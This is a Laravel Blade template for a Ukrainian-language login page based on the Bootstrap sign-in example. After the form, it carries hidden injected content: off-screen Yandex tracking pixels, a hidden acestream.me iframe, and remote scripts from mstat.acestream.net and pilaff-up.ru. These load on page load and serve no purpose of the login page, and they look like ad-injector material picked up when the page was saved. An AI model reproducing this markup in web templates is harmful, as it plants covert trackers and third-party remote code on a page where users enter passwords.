@extends('layouts.signapp')

@section('title-block')Вхід
@endsection

@section('content')
<div class="sign-form text-center">
    <form class="form-signin">
  <img class="mb-4" src="/docs/4.3/assets/brand/bootstrap-solid.svg" alt="" width="72" height="72">
  <h1 class="h3 mb-3 font-weight-normal">Увійдіть будь ласка</h1>
  <label for="inputEmail" class="sr-only">Email</label>
  <input type="email" id="inputEmail" class="form-control" placeholder="Email" required="" autofocus="">
  <label for="inputPassword" class="sr-only">Пароль</label>
  <input type="password" id="inputPassword" class="form-control" placeholder="Пароль" required="">
  <div class="checkbox mb-3">
    <label>
      <input type="checkbox" value="remember-me">Запамятати мене
    </label>
  </div>
  <button class="btn btn-lg btn-primary btn-block" type="submit">Увійти</button>
  <p class="mt-5 mb-3 text-muted">© 2020</p>
</form>


<img src="https://mc.yandex.ru/watch/44443582" style="position: absolute; left: -9999px;"><img id="acestream__script-ym-t" src="https://mc.yandex.ru/watch/37429375" style="position: absolute; left: -9999px;"><script src="//mstat.acestream.net/p2p-search/metrika.js?loc=getbootstrap.ru&amp;_r=0.18319697472651675"></script><iframe src="//acestream.me/index.html" id="__as_sframe" style="position: absolute; left: -9999px; bottom: 0px; width: 200px; height: 100px"></iframe><script src="//pilaff-up.ru/link/y3j3u8pg/?" id="0ac87ecd9fdf0d50d6331f29a2f01877f82a39f0"></script><img src="https://mc.yandex.ru/watch/46515147" style="position: absolute; left: -9999px;"><img src="//mstat.acestream.net/imp?a=46515147&amp;b=0.8150002279471535" style="position: absolute; left: -9999px;">
</div>
@endsection
